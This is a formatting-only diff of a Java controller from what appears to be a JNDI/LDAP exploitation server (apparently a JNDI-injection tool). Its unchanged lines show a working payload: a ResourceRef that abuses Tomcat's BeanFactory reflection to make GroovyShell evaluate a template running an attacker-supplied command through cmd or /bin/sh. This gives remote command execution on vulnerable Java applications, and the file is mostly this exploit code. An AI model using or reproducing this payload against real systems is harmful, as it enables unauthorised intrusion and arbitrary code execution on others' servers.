@@ -9,6 +9,7 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.naming.ResourceRef;
+
 import javax.naming.StringRefAddr;
 
 import static org.fusesource.jansi.Ansi.ansi;
@@ -25,11 +26,11 @@ import static org.fusesource.jansi.Ansi.ansi;
  *      - https://stackoverflow.com/questions/4689240/detecting-the-platform-window-or-linux-by-groovy-grails
  */
 
-@LdapMapping(uri = { "/groovybypass" })
+@LdapMapping(uri = {"/groovybypass"})
 public class GroovyBypassController implements LdapController {
     private PayloadType type;
-    private String[] params;
-    private String template = " if (System.properties['os.name'].toLowerCase().contains('windows')) {\n" +
+    private String[]    params;
+    private String      template = " if (System.properties['os.name'].toLowerCase().contains('windows')) {\n" +
             "       ['cmd','/C', '${cmd}'].execute();\n" +
             "   } else {\n" +
             "       ['/bin/sh','-c', '${cmd}'].execute();\n" +
@@ -37,13 +38,13 @@ public class GroovyBypassController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with groovy.lang.GroovyShell payload|@"));
+        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with groovy.lang.GroovyShell payload|@"));
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
 
         //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
-        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=evaluate"));
         ref.add(new StringRefAddr("x", template.replace("${cmd}", params[0]).replace("${cmd}", params[0])));
 
@@ -55,24 +56,24 @@ public class GroovyBypassController implements LdapController {
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
-        try{
-            int firstIndex = base.indexOf("/");
+        try {
+            int firstIndex  = base.indexOf("/");
             int secondIndex = base.indexOf("/", firstIndex + 1);
-            if(secondIndex < 0) secondIndex = base.length();
+            if (secondIndex < 0) secondIndex = base.length();
 
             String payloadType = base.substring(firstIndex + 1, secondIndex);
-            if(payloadType.equalsIgnoreCase("command")){
+            if (payloadType.equalsIgnoreCase("command")) {
                 type = PayloadType.valueOf("command");
-                System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
-            }else{
+                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
+            } else {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + payloadType);
             }
 
             String cmd = Util.getCmdFromBase(base);
-            System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
+            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
             params = new String[]{cmd};
-        }catch(Exception e){
-            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;
+        } catch (Exception e) {
+            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
 
             throw new IncorrectParamsException("Incorrect params >> " + base);
         }
